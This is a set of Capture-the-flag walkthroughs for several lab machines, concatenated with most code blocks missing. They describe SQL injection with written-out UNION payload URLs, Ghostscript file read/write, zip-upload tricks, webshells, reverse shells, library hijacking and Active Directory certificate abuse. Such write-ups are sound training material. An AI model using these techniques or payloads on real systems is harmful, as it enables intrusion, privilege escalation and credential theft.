genlabel is actually a Python script. The script connects to the DB as the bookworm user, just like the website:
It uses the input order id to query the DB:
This is done in an insecure manner, and will be vulnerable to SQL injection.
It creates a postscript file from a template and replaces some template strings with the data from the DB:
Finally it uses subprocess to run ps2pdf on the file and generate a PDF:
The -dNOSAFER flag is passed to ps2pdf, which, according to Ghost Script docs means:
-dNOSAFER (equivalent to -dDELAYSAFER).
This flag disables SAFER mode until the .setsafe procedure is run. This is intended for clients or scripts that cannot operate in SAFER mode. If Ghostscript is started with -dNOSAFER or -dDELAYSAFER, PostScript programs are allowed to read, write, rename or delete any files in the system that are not protected by operating system permissions.
Being able to read and write files seems very useful.
I noted above that the SQL query made by genlabel looked like it should be vulnerable to SQL injection. If that is the case, I can control what gets written into the .ps file. PostScript is a page description language used to define what a document will look like, similar to a PDF. If I can control the PS output, then when it is passed to ps2pdf in such a way that dangerous postscript commands can be run, I can read and write files.
The SQL query is:
I’ll give it a order that doesn’t exist (99999) and then use UNION injection to return a row of values I control:
I’ll scp the output to my host:
The output I set shows up in the PS file in blocks like this:
These show up in the PDF:
So the SQL injection works.
The documentation for how to do file I/O through PostScript isn’t great, but this Stack Overflow answer offers a nice POC:
It write a file, then reads that file and writes the results to another file. I can start with writing a file with just the last block replacing exch with some static text:
Putting that into the injection:
I don’t care about the PDF output, but rather, that there’s an output.txt in the current directory:
I spent a long time with ChatGPT trying to get a POC that would read a file into the PDF without success. I’ll end up back with the POC from above, this time grabbing the second and third blocks:
I’ll need to increase the number on the second line, as that’s the number of bytes to be read, and I want more than 100. I’ll run this via the SQL injection:
That’s file read!
With the file write POC, I can simply update it to write my public SSH key into root’s authorized_keys file:
Then I can SSH in as root:
And read the flag:
One way to get a shell via read is to read the SSH key of root. Each user so far has has a id_eh25519 file in their .ssh directory. I’ll try to read roots:
The private key is in output.txt:
As long as I haven’t already overwritten authorized_keys, I can use that to SSH into the box:
I’m going to take a quick look at the code in the website that allows for downloading of e-books either as a single PDF or as multiple files in a zip.
A useful bit of background for understanding this code is to understand how the NodeJS Express framework handles Query Parameters. This blog post demonstrates with some nice examples. ?color=black sets that parameter to a string, black. But ?color=black&color=green sets it to a list like ["black", "green"].
That’s how the code is able to use a typeof call to differentiate between a single download and multiple:
The single download code creates a filename of ID.pdf:
Then it calls res.download (docs), which takes a path to the file, a filename, and options, and returns a file with the given name:
Here, the bookIds is a single number, and the fileName is the [number].pdf. The option of root puts it in the books directory, which is a directory that holds a bunch of number files that are pdfs:
Injection traversal into this doesn’t work.
This is because of the root parameter passed to download, which has Express return 403 if it tries to read outside the root directory, in this case /var/www/bookworm/books.
This code path uses the archiver module. It creates an archiver object, and then uses the file API to add files to the object.
The file path this time is created with a path.join(__dirname, "books", id), which is totally open to traversal as I control id.
It tries to look the book name up in the database using the Book object, but it is nice enough to use notation such that if no book name is found, it will fall back to “Unknown”. This is why all of my exfil when I do get a directory traversal comes out as Unknown.pdf, and what limits me from trying to collect multiple files in the same archive.
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 26 Aug 2023
OS : Linux
Base Points : Medium [30]
Nmap scan:
Host is up (0.11s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (80):
Based on the OpenSSH and Apache versions, the host is likely running Ubuntu 23.04 lunar.
The site is for a watch store:
Most of the links to either to another spot on the page or are dead. There is a Contact form, but submitting it just sends a GET request without any of the form data, reloading the main page.
There are two links that go to another page. At the top right there’s a “Work with Us” button that leads to /upload.php:
The upload capability says it accepts a zip file with a PDF inside.
Also in the nav bar is a link for “Shop”, which leads to /shop:
Clicking an individual item shows details:
I’m able to add to cart and place an order.
I have a pretty good idea this is a PHP site at this point. Visiting /index.php loads the main page.
The HTTP response headers don’t say much besides Apache:
I’ll run feroxbuster against the site, and include -x php since I know the site is PHP:
Nothing I didn’t know about at this point.

Category: Shell as rektsu
I’ll take a closer look at the file upload capability on the website. It wants a PDF inside a Zip, so I’ll make one:
When I submit this, the page reloads with a message over the form:
The yellow text is a link to /uploads/[md5 of zip]/[filename]. Clicking it returns the same PDF uploaded.
If I change the contents of the archive, it changes the directory. If I try to include a second file, it says “Please include a single PDF file in the archive.” If I try to include something that doesn’t end in .zip, it says “The unzipped file must have  a .pdf extension.”
If I try to upload a non-zip (say, a PNG), it says “Error uploading file.” Even if I take the valid .zip file and rename it to .png, when I upload it, the site returns the same “Error uploading file” error. So that error is likely based on extension.
It seems that the filtering is done by file extension. If I create a text file and name it test.zip, uploading that also returns “Error uploading file”.
So how will the site handle a symbolic link with a .pdf extension? I’ll create one:
It’s important to give zip the --symlinks argument, or else zip will follow the link and put a copy of my /etc/passwd into the archive.
It uploads just fine:
Clicking the link shows an empty PDF:
If I look in Burp, I’ll see that’s because the browser is trying to render a PDF, but the response isn’t a PDF:
That’s file read!
I’ll note the user on this box is rektsu, and there’s also a mysql user. In fact, I can make a payload that will return the user flag:
On viewing it:
I’d like to make a script to make reading files from Zipping easier. I’ll walk through that in this video:
The final code is:
And it works (for both text and binaries):
I’m able to get the Apache config file for the site in the default location, /etc/apache2/sites-enabled/000-default.conf. Removing commented lines, it looks very standard:
It is hosted out of /var/www/html, and disallows indexing on the uploads directory.
I’m able to read the page source using my script:
The intended path for Zipping now turns to the shop directory (though there is an unintended path via the zip upload that I’ll explore in Beyond Root).
index.php is short:
It brings in functions.php and calls pdo_connect_mysql, which isn’t a standard function, so it must be defined and imported. Then it includes the page defaulting to home.php. Including pages like this is a common PHP pattern, and one that can lead to local file include (LFI) vulnerabilities. Here there are two smart checks made that limit attacks:
Still, if I can get a PHP file onto Zipping in a known location, I would be able to execute it. I’ll keep that in mind (I’ll use this later for both the intended method as well as two unintended paths in Beyond Root.)
functions.php defines functions for a header and footer, as well as the MySQL connection:
I’ll note those creds. It’s also worth noting that the MySQL user is root, which implies it is likely to have more permissions on the DB.
product.php is interesting, specifically for how it interacts with the database at the top of the file:
It’s using a dangerous method for interacting with the database, building a string with user input and passing it to prepare. It tries to mitigate for that with a regex looking for anything that’s not a digit 0-9, and just redirecting to index.php if found.
HackTricks has a page on PHP tricks, and one section is about bypassing preg_match with .*. The issue is that preg_match only checks the first line of input for .*. So if I can start my input off with a newline, it won’t match. This is the example from the page:
I’ll see how this might work with the url http://10.10.11.229/shop/index.php?page=product&id=3. It shows a watch:
If I try id=3 or select 1=1, it redirects to the main page.
If I try id=%0a3, it loads just like normal:
That suggests that the newline is not messing it up. Building it a bit more towards SQLI, I’ll try injection to give it an ID that doesn’t exist (100) and then use injection to get something else there with id=%0A100'+or+'1'='1. This loads the page with the first watch:
That’s successful SQL injection!
In the injection above, I just let the intended ' close out the injection. The site is doing:
So when I send %0A100'+or+'1'='1, that makes:
If I want to do something like UNION injection, I’ll need to “use up” that trailing '. Typically, I would send id=%0A100'--+-, but that results in a redirect back to the index. Why? A bit closer look at the filtering regex is required:
Because no parentheses are used, this is effectively two distinct regex:
So it matches if either of the following are true:
If not for the newline injection that bypasses the first, these two would be pretty close to equivalent. When I bypass the first with %0A100'+or+'1'='1, it also is ok on the second because it ends with digit.
Conveniently, I’m trying to add a comment to the end. That means that anything after the comment marker is also just comment, so I can easily add a digit. Sending id=%0A100'--+-1 doesn’t redirect, but returns “Product does not exist!”, the same as just id=100, which means the comment works.
It’s worth noting that starting a regex string with ^.* is basically the same as replacing that with nothing. Must be at the start but then after 0 or more of anything is back to the default. Except that it allows this to be exploited. Still, regex is a confusing enough thing that I’ve seen lots of this pattern in the real world, so I don’t think it’s fair to call this part unrealistic.
I’ll use UNION injection to read the database. I can start with id=%0A100'+union+select+1;--+-1. This returns an empty page, which probably represents some kind of SQL error. I expect this, as it would only work if the queried table only have one column. I’ll start checking other lengths until I get to 8, where it returns:
Comparing this to the page (and looking at the raw HTML), I can assert that the products table probably has the following columns:
I can enumerate the rest of the database, but there’s not much interesting in it.
All of this SQL injection can be automated using sqlmap.  I’ll need to use the --prefix and --suffix parameters to add the leading newline and the trailing digit, and it needs at least --level 2 to find it:
It is interesting that it finds a stacked queries attack, rather than union injection. This is a blind technique and will run very slowly.
I noted above that the application is connecting to MySQL as the root user. It’s worth checking for what permissions that user has. Privileges are stored in the information_schema.user_privileges table, so I’ll inject with id=%0A100'+union+select+1,2,group_concat(grantee, ':', privilege_type),4,5,2,7,8+from+information_schema.user_privileges;--+-1:
It’s a bit hard to read in that screenshot, but one privilege jumps out:
The FILE privilege:
Affects the following operations and server behaviors:
I want a PHP webshell. As a quick test, I’ll write a quick PHP file into /dev/shm with:
It returns “Product does not exist!”, which means it worked. If I try to write to the same file again, it will return an empty page, which indicates failure. It doesn’t want to overwrite existing files.
I’ll now load that using the LFI identified above with http://10.10.11.229/shop/index.php?page=/dev/shm/0xdf:
That’s executing my PHP to show the info. That’s code execution.
It’s worth nothing that while this works in /dev/shm, it won’t work in /tmp, because Apache’s using a sandboxed tmp directory, SYSTEMD_PRIVATE. .
To get a webshell, I’ll change the injection to write a webshell:
Now to execute it I’ll just visit it with cmd=id:
To turn that into a shell, I’ll start nc and update the cmd to a bash reverse shell:
It is important to encode the & to %26 so that it’s not treated as the end of the parameter and start of another.
At nc, I get a shell:
I’ll upgrade using the standard trick:
And grab user.txt if I hadn’t already above:

Category: Shell as root
rektsu can run the stock binary as root on Zipping:
Basic enumeration of this binary shows that it asks for a password:
Running as root doesn’t change this:
Running strings on the binary dumps a bunch that provides hints as to this binaries purpose, but also a string that looks like a potential password just before the string “Enter the password:”:
Entering that works:
Before running strings, I tried to run ltrace on the box to see if it would show the strcmp, but ltrace isn’t on Zipping. strace is, but doesn’t show the comparison:
There I enter “0xdf” and see the write call showing it failed.
If I try strace with the correct password, I’ll notice something interesting just after:
Before it prints the menu, it attempts to load /home/rektsu/.config/libcounter.so, but fails because that file doesn’t exist.
If I can create a malicious shared object (library) in that location, it will be loaded by the binary. Any code I put into a constructor will be executed. I’ve shown this before, most recently with Broker.
I’ll write a simple C file:
It marks the shell function as a constructor, which means it runs when the library is loaded. That function simply calls /bin/bash, interrupting the flow of the program and returning an interactive shell.
I’ll compile this as a shared object:
Now when I run sudo stock, after putting in the password, it drops into bash as root:
And I’m able to read the flag:
Both these technique allows for skipping the /shop pages and SQL injection entirely, focusing rather on how files are uploaded to Zipping and abusing clever ways to bypass the LFI restrictions:
This unintended solution has to do with how null bytes in filenames inside zip files are handled, specifically that there’s a difference between how 7z and PHP handle them. IppSec tipped me off to this, and we had a good time digging into it to figure out exactly how it works.
It seems HTB patched an issue like this on 7 September 2023, two weeks after its release:
I don’t know what that patch did, but this is still exploitable today.
Creating a zip archive with a null in the filename of a file inside it is tricky. I don’t know a good way to do it with zip. Python doesn’t let me write a file with a null byte in the filename:
Python will create a Zip when given a null in the filename:
However, if I look at a hex dump of the resulting file, the \x00.pdf is gone:
Instead, I’ll write one with two dots, the first acting as a placeholder:
Now I’ll open nulls.zip in a hex editor find the references to the filename:
Changing the first one will break 7z, which is important because that’s what Zipping uses. I’ll just change the first null in the second filename:
Once I’ve edited the null into the second filename instance inside the zip, unzip and 7z both show it as just 0xdf.php, stopping at the null:
Turning to PHP, to be able to work with Zip archives, I’ll need to install apt install php-zip. With that, I’ll drop to a PHP shell and open nulls.zip:
It has one file:
And the name includes the null:
With that background, I’ll look at the code on Zipping that handles the uploaded zip archive. It starts by getting a hash, using it to make an uploads path, and getting the temp directory location:
sys_get_temp_dir() just returns /tmp, or sometimes /var/tmp:
On Zipping it’s /tmp as well.
Then it opens the given archive, makes sure there’s exactly one file, and gets the filename:
It then checks that the name ends with .pdf, and if so, it uses 7z to extract the file into the $uploadPath:
If the file then exists, it moves to to $uploadDir, which is in the web directory.
So what happens with the null byte in the name on Zipping? It will get the zip and when it gets the filename, it gets the full name, 0xdf.php\x00.pdf. It checks that the file has a .pdf extension, which it does. It then uses 7z to extract, creating the file /tmp/uploads/[hash]/0xdf.php.
Then PHP checks if the file exists, and it doesn’t, as it’s looking for /tmp/uploads/[hash]/0xdf.php\x00.pdf. So it doesn’t move the directory to the web, and it continues (sending back a success message with the path that doesn’t exist).
If I upload nulls.zip via the webpage, it returns a link:
Clicking it returns a 404:
If I use the LFI to include that page, it gives code execution:
PHP has this concept of PHAR (short for PHP Archive) files. They are kind of like what JAR files are for Java, a single file that contains an entire application. They can be referenced by using the phar:// filter, like this: phar://path/to/archive.phar/file_in_archive.
There are complex ways to create a PHAR file, with a lot of good detail in this blog post. But they can also just be Zip files.
I said earlier that this LFI was harder to exploit because of the file_exists call. What’s useful about the phar:// wrapper here is that it passes the file_exists call if the file inside it exists.
To demonstrate, I’ll create a simple text file in a zip:
Now from PHP, I can access that file inside the archive:
And it returns true for file_exists:
It also doesn’t matter what the extension is. If I rename test.zip to test.pdf:
It still works the same:
I’ll create a simple webshell, shell.php:
I’ll zip it into a file called shell.pdf:
I’ll put that into a zip archive called shell.zip:
Now when I upload that zip, Zipping will unzip shell.pdf and return me the link to it:
I know that file is at /var/www/html/uploads/ea409d50349a8436fe49f7ec66aa6132/shell.pdf, so I can visit:
And it runs the given command, id:
That’s a super cool trick!
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 08 Jul 2023
OS : Linux
Base Points : Easy [20]
Nmap scan:
Host is up (0.11s latency).
Not shown: 65531 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknownCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (55555), as well as two filtered ports, 80 and 8338:
Based on the OpenSSH versions, the host is likely running Ubuntu 20.04 focal.
The site is a service for collecting and inspecting HTTP requests:
On clicking create, it returns a token that can be used to access the basket in the future:
Opening the basket, it shows how to populate it:
If I run curl http://10.10.11.224:55555/h5lgafg, it shows up in the basket:
The HTTP response headers don’t say much:
All of the URLs seem extension-less, and I’m unable to guess at one that loads the index page.
The footer of the home page does say “Powered by request-baskets | Version: 1.2.1”. This is a software written in Go.
I’ll run feroxbuster against the site:
It finds some errors, but nothing interesting.

Category: Shell as puma
Searching for “request-baskets exploit” leads to this blog post about CVE-2023-27163. It’s a server-side request forgery (SSRF) vulnerability, which means I can get the server to send requests on my behalf. The post calls out version 1.2.1 as vulnerable:
There’s a nice POC here to exploit this. I’ll run it to try to read port 80:
It gives a URL I can visit to see the results:
The CSS and images aren’t loading, but I can at least see it’s Mailtrail v0.53.
I’ll try the same thing on 8338, and find it’s the same application.
Searching for “Mailtrail exploit”, the first hit is this repo which has an unauthenticated code execution vulnerability in Mailtrail v0.53. The login page doesn’t sanitize the input for the username parameter, which leads to OS command injection.
This script is pretty hacky, using os.system in Python to call curl to make the request:
It’s a simple POST request to the given url plus /login.
To exploit this, I’ll grab the POC, but remove where it adds /login on line 28. I’ll get a new SSRF url that goes to /login:
Now I’ll run the modified exploit script:
It hangs, but at a listening nc there’s a shell:
I’ll use the standard trick to upgrade my shell:
I’l grab user.txt from the puma user’s home directory:

Category: Shell as root
The puma user can run some systemctl commands as root without a password using sudo:
Running this command prints the status of the service:
If the screen is not big enough to handle the output of systemctl, it gets passed to less. In fact, because I’m in a weird TTY, when I run with sudo, this happens:
At the bottom of the terminal there is text and it’s actually hanging. If I enter !sh in less, that will run sh, and drop to a shell:
And I can grab the flag:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 01 Apr 2023
OS : Windows
Base Points : Insane [50]
Nmap scan:
Host is up (0.091s latency).            
Not shown: 65508 closed ports   
PORT      STATE SERVICE
53/tcp    open  domain                 
80/tcp    open  http                   
88/tcp    open  kerberos-sec                                  
135/tcp   open  msrpc   
139/tcp   open  netbios-ssn   
389/tcp   open  ldap     
443/tcp   open  https                                           
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5                      
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl                
5357/tcp  open  wsdapi                 
5985/tcp  open  wsman                                         
9389/tcp  open  adws
47001/tcp open  winrm                      
49664/tcp open  unknown          
49665/tcp open  unknown
49666/tcp open  unknown                    
49667/tcp open  unknown
49673/tcp open  unknown                          
49687/tcp open  unknown
49689/tcp open  unknown                    
49691/tcp open  unknown                                             
49700/tcp open  unknown                                    
49712/tcp open  unknown
49719/tcp open  unknown                                        
51761/tcp open  unknownCategory: Recon
nmap finds a ton of open TCP ports:
Based on this combination of ports, this seems like a Windows domain controller.
Triaging the ports, I’ll group them as follows:
netexec (modern crackmapexec) shows a domain name of coder.htb and a hostname of DC01:
Trying the --shares flag gets denied:
But trying with a dummy user works:
I have read access to the Development and Users shares.
This share has two folders:
Migrations has a few folders with what looks like publicly available stuff:
Each of these might be in use or a hint at what’s to come.
The exception is teamcity_test_repo, which has a single PowerShell script and a Git repo:
I’ll grab a copy of that. It’s literally just a PowerShell “Hello, World!” script, but the comment at the top is interesting:
I’ve seen a couple references to Teamcity already.
Temporary Projects has two files:
I’ll download both of these.
This share has access to the home directories of the Public and Default users:
There’s nothing of interest here.
I’ve got the domain coder.htb already. I can try a zone transfer, but it fails:
Trying reverse lookups just fails. I’ll try dnsenum to brute force subdomains slowly in the background (and confirm the manual checks), but it doesn’t find anything unusual (all domains have these subdomains):
I’ll fuzz subdomains on both 80 and 443 with ffuf, but neither finds anything. I’ll add coder.htb and dc01.coder.htb to my /etc/hosts file.
Visiting the site as either coder.htb or by IP just returns the IIS default page:
The HTTP response headers show just the IIS version, same as what nmap identified:
The 404 page looks like the default IIS 404:
I’ll run feroxbuster against both HTTP and HTTPS, but it finds literally nothing.
It seems like there’s a subdomain to find, and probably not through brute force.

Category: Shell as svc_teamcity
The file is a Windows 32-bit .NET executable:
I’ll load it into dotpeek to take a look at the code. There’s only a single namespace with a class AES with two functions:
The Main function requires a filename as an arg:
It generates a random IV and key, and calls EncryptFile, passing in the filename plus .enc. EncrtyptFile encrypts the file with AES and writes it to the .enc file:
While the key and IV are chosen at random, that random is seeded with the current time. It is possible to get the last write metadata from the file over the SMB share. It is not preserved when I get it with smbclient as I did above. However, if I mount the share on my system, the metadata will be preserved:
Now the stat command will give exactly what I need:
The easiest way to decrypt this file is to start with the existing C# code and modify it. I’ll walk through that in this video:
The resulting code is:
The resulting file is a 7-zip archive:
It has two files:
I’ll extract them (7z x s.blade.7z).
I like kpcli to interact with KeePass dbs. I’ll open it with the .key file. Giving it a wrong password fails:
But an empty password works (I didn’t know you could do that):
There are three entries:
The first is Authenticator backup codes - I’ll come back to this.
The second looks like creds for s.blade on the box, but they don’t work over WinRM (either they are bad or s.blade isn’t in the Remote Management Users group).
The third one leaks a subdomain! I’ll add it to my /etc/hosts file. I’ll also try both passwords to login over WinRM with s.blade, but neither work.
On 80 that subdomain still returns the default page. But on 443, it returns a redirect to /login.html, TeamCity login:
Entering s.blade’s creds leads to a two factor prompt:
It seems clear here that I have the information necessary to get this code in the “Authenticator backup codes” JSON, but it also says it’s encrypted.
There’s a Chrome and Firefox extension called Authenticator. I’ll install it in Firefox, and it looks like an application that provides 2FA time based codes:
I’ll click the pencil icon and then the plus to add a code, and pick “Manual Entry”:
The secret needs to be 16 characters, and on clicking “Ok”, there’s a entry:
Clicking the gear icon, there’s a “Backup” option”:
That leads to:
The backup file doesn’t look like what I got from KeePass:
Also on the menu there’s a “Security” option. Clicking that offers a chance to set a password:
Once I do that, there’s another option on the “Backup” screen:
That looks just like the file from Coder!
The code for this plugin is on GitHub, and in the repo root there’s a file named webpack.config.js. On lines 5-17, it defines the imports:
import seems like the part I care about. In src/import.ts, on lines 59-93 is the function decryptBackupData. It takes backupData and a passphrase.
It loops over each object in backupData, and assuming all the parts are there, it calls CryptoJS.AES.decrypt with the secret value from the backupData and the given passphrase.
If I search GitHub in this repo for decryptBackupData, it is called in src/components/Import/TextImport.vue. In fact, on lines 76-80, it’s called like this:
It’s taking the key.enc and decrypting it with the password, and then that becomes the key to decrypt the secret blob to get the key.
I’m going to brute force the password for this encrypted backup. I could potentially try to crack that Argon2 hash, but that would be really slow. Alternatively, I can try to do two AES decryptions, and that won’t be slow at all.
I’ll use JavaScript to write a program to brute force passwords looking for the right one in  this video:
The resulting script is:
Running that returns the password of “skyblade” and the seed:
I’ll go back into the Authenticator plugin, click the pencil then the plus, and fill it in:
Now at teamcity-dev.coder.htb, I’ll log in with s.blade / veh5nUSZFFoqz9CrrhSeuwhA, and when it asks for a code, get it from Authenticator. It’s a bit slow, but it logs in:
There’s one project in TeamCity, “Development_Testing”:
The project shows one build back when the box was just going to release:
If I go into that build, under the Parameters tab, it shows it is configured to use the repo on the file share from above:
Under “Build Log”, there’s the results of the pipeline, including where the hello_world.ps1 script is run and the output is presented:
Clicking the “Run” button starts another pipeline and gives similar results.
The “…” button next to “Run” loads the options for a run:
The “run as personal build” option is documented here:
A personal build is a  build-out of the common build sequence which typically uses the changes  not yet committed into the version control. Personal builds are usually  initiated from one of the supported IDEs via the Remote Run procedure. You can also upload a patch with changes directly to the server, as described below.
I don’t have write access to the SMB share, so I can’t change the repo contents there. However, I can use the personal build option to upload a diff file to effectively make changes to the repo that way.
I’ll create a dummy repo and add hello_world.ps1:
I’ll update hello_world.ps1 to include commands to fetch netcat from my server and return a reverse shell:
Running git diff shows the diff output for this vs what’s already committed:
I’ll save it as shell.diff.
With a Python webserver serving nc64.exe, and nc listening on 443, I’ll start a run with the advanced options:
A few seconds after submitting there’s a request at the webserver:
Then a shell at nc as svc_teamcity:

Category: Shell as e.black
The home directory for svc_teamcity is basically empty. There are other users on the box:
user.txt must be with e.black.
There’s not much of interesting the C:\TeamCity directory. However, in looking around, there’s a JetBrains\TeamCity directory in C:\ProgramData:
In the system folder there’s a folder named changes:
These are changes to the repo. For example, 204.changes.diff (and all the other recently ones) is the changes that give me a shell:
101.changes.diff is from before the box release, and different:
This diff shows 2 additional files. Get-ADCS_Report.ps1 loads a key from key.key and uses it to decrypt enc.txt into a password for the e.black user. Then it sends an email using those creds.
enc.txt has a base64-encoded string. key.key has a series of bytes as ints.
To get the password, I’ll create copies of enc.txt and key.key and upload them to Coder:
Then in PowerShell I’ll use the commands above to load them into variables and get the raw password
I’ll connect as e.black over WinRM with Evil-WinRM:
And grab user.txt:

Category: Shell as administrator
I’ll collect Bloodhound data using the Python script remotely from my host:
I’ll upload that data into the Bloodhound GUI. The first thing I typically do is mark the users I own as owned. In this case, that’s svc_teamcity, e.black, and probably s.blade.
e.black doesn’t have any outbound control. They are a member of an additional interesting group, PKI Admins:
While this is not a default group, it seems like it’ll have control over PKI things. The comment on the group confirms this has to do with ADCS:
s.blade also has no outbound control, but is a member two groups, “Software Developers” and “Buildagent Mgmt”:
Both groups have to do with TeamCity:
One thing to look at here is the organizational units (OU) in this AD. This can be done with PowerShell:
Most of those are standard, though Development and BuildAgents are unique to Coder.
While Bloodhound doesn’t show any interesting permissions, it makes sense that BuildAgent Mgmt would have some permissions over BuildAgents. I can look for what permissions exist on this OU using PowerShell:
There’s a lot there, but I’m particularly interested in the rights from groups I have control over. BuildAgent Mgmt has some access:
Object Type bf967a86-0de6-11d0-a285-00aa003049e2 is a Computer object, and 72e39547-7b18-11d1-adef-00c04fd8d5cd is a Validated-DNS-Host-Name.
This post does a really nice job of describing a vulnerability, CVE-2022-26923, in Windows that was patched before Coder was released.
In this vulnerability, the DNS host name property (dNSHostName) were not required to be unique on a domain, and thus, it was possible to change the dNSHostName property on a computer the attacker has full control over to match that of a target computer (like the DC), and then abuse ADCS to get a certificate as that DC. This would give the attacker the ability to do things as the DC, like dump the hashes.
The post also says that while this vulnerability was patched in the May 2022 security updates, that:
Certificate Templates with the new CT_FLAG_NO_SECURITY_EXTENSION (0x80000) flag set in the msPKI-Enrollment-Flag attribute will not embed the new szOID_NTDS_CA_SECURITY_EXT OID, and therefore, these templates are still vulnerable to this attack. It is unlikely that this flag is set, but you should be aware of the implications of turning this flag on.
e.black has permissions over the PKI / ADCS. I’ll use this to import a new ADCS template with the CT_FLAG_NO_SECURITY_EXTENSION flag set.
Then as s.blade, I’ll add a computer to the domain, specifically to the BuildAgents OU, with the dNSHostName set to DC01.coder.htb.
Then I’ll enroll that new machine with the malicious template.
Then I’ll use certipy to get a certificate for the DC, using the password associated with the newly added computer as auth.
With that certificate, I can dump hashes from the DC.
I’ll use ADCSTemplate PowerShell scripts to interact with templates on the host. I’ll upload it, and import it:
I’ll list the current templates:
There’s a bunch, but Computer seems like the one to copy from. I’ll export it to a JSON file:
Now I can read that back in, and change that flag:
Now I create the template:
Impacket has a script to add a computer object to a domain, but it doesn’t by default give the user control over the DNS name. I’ll make a copy of that script:
The string dns shows up at line 229:
I’ll change the script so that the DNS hostname is always DC01:
Now I’ll add the computer:
Now I’ll enroll that computer object in the template:
Now I’ll use Certipy to get the certificate for the dc01.coder.htb machine:
For the final step to work, I’ll need my clock synced with Coder, running sudo rdate -n dc01.coder.htb. Then use that certificate to authenticate and get the hash for the legit DC01 machine:
Now that I have the NTLM hash for the DC01 machine account, I’ll ask it to give me all the hashes for the domain with secretsdump:
The most important one is the top one, Administrator.
e.black has rights to create ADCS templates. Above I showed doing that to upload a template misconfigured like what led to CVE-2022-26923. But I can upload really any vulenable template.
I’ll take a look at what certipy shows about the same “Computer” template I modified above. I’ll run it to get all templates and save them to a file:
The results for “Computer” are:
Let’s make a copy of this that’s vulnerable to ESC1. BlackHills has a nice post that lays out what’s required for ESC1, including this image:
Comparing that to the “Computer” template above, I’ll need to change the “Enrollee Supplies Subject” and “Certificate Name Flag”. If I do a search in the Certipy repo for that string, I’ll see they are likely related, and the ENROLLEE_SUPPLIES_SUBJECT value is 1:
It has to do with msPKI-Certificate-Name-Flag. I’ll start by getting a template as an object in PowerShell like above:
I can find the exact name for the property I need to change:
I’ll set that to 0x1:
Now output it to JSON and then create the template, and enroll e.black:
If I scan Coder with certipy now looking for vulnerable templates (with -vulnerable), this new template comes out:
ESC1 is what I’ve configured, and ESC4 is because e.black owns the template (and therefore could abuse it).
I’ll use certipy to request a certificate and key for administrator:
Using administrator.pfx, I’ll dump the NTLM hash for administrator:
Regardless of how I get the administrator user’s NTLM, I’ll use it to get a shell over WinRM:
And grab root.txt:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 15 Jul 2023
OS : Windows
Base Points : Medium [30]
Creators : mrb3nSentinal920
Nmap scan:
Host is up (0.10s latency).
Not shown: 65380 closed tcp ports (reset), 126 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
8443/tcp  open  https-alt
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49673/tcp open  unknown
49688/tcp open  unknown
49689/tcp open  unknown
49691/tcp open  unknown
49692/tcp open  unknown
49700/tcp open  unknown
49706/tcp open  unknown
49710/tcp open  unknown
49730/tcp open  unknownCategory: Recon
nmap finds a bunch of open TCP ports:
Based on the combination of ports, this looks like a Windows domain controller that is also running an HTTP/web server on 80.
Triaging the ports, I’ll group them as follows:
netexec (formerly crackmapexec) shows the domain name of authority.htb and a hostname of authority:
If I try to list the cred with no creds, it fails, but with some junk creds it works:
The “Department Shares” share is interesting, but I don’t have access.
The share I can access is “Development”. It has a single directory Automation\Ansible that has four directories:
Each has an Ansible setup for the given technology. For example, ADCS:
Active Directory Certificate Services (ADCS) is a very juicy target, but not much I can do without creds. I’ll note that one as a hint to check back on.
With TCP 53 open, I’ll try a zone transfer on the domain identified by SMB enumeration:
Zone transfers aren’t allowed.
A reverse look up doesn’t give anything useful either:
I could brute force, I’ll wait at this point. I’ll add authority.htb to my /etc/hosts file:
The site loads the default IIS page, both by IP and by domain name:
The HTTP response headers just show IIS:
The 404 page looks like the default IIS page:
I’ll take a few guesses at the index page, but everything returns 404 (which isn’t odd for an IIS server).
I’ll run feroxbuster against the site:
Absolutely nothing.
The TLS certificate is not useful:
The web root redirects to /pwm/, presents an instance of PWM:
PWM is:
an open source password self-service application for LDAP directories.
Clicking on the down arrow at the top right gives more information:
“open configuration mode” must be why those two additional button are below the “Sign in” button. Clicking on any of them loads another screen asking for a password:

Category: Shell as svc_ldap
One of the directories in the SMB share was named PWM:
I’ll download the files:
The ansible_inventory file has what looks like some credentials for WinRM:
I’ll try those with netexec, but they don’t work:
defaults/main.yml has configuration values for PWM:
The values in the file above are protected with Ansible Vault. The Jumbo John The Ripper repo has a script, ansible2john.py. The script takes in a file with two lines, the first being the header and the second being the hex-encoded values above. I’ll format the three protected values into files:
Now I can run ansible2john.py to make hashes:
hashcat can handle these:
They all have the same password, !@#$%^&*, which makes sense since they are encrypted in the same ansible file.
pipx install ansible-core installs a bunch of ansible tools, including ansible-vault, which can decrypt the blobs with passwords:
I’ll try this password combination with netexec. On SMB, it seems to work, but then it can’t access any shares:
It can’t access WinRM and fails to access LDAP for some reason:
Not accessing LDAP seems like a problem for PWM.
On the PWM login screen, I’ll enter the credentials and hit “Sign in”:
The result is this popup:
This looks similar to what I was getting with netexec.
The password pWm_@dm!N_!23 works to log into the configuration manager:
PWM is running out of C:\pwm.
It also works to get into the Configuration Editor:
There are tons of options here I can mess with. In the LDAP connection config, I get the same hostname, authority.authority.htb, as well as the svc_ldap username:
The creds used are stored, but not retrievable through the web GUI:
There are some cached credentials stored. To recover them, I’ll edit the URL to point at me, using cleartext LDAP rather than LDAPS (and using the default LDAP port 389):
I’ll listen with nc on 389 and click “Test LDAP Profile”:
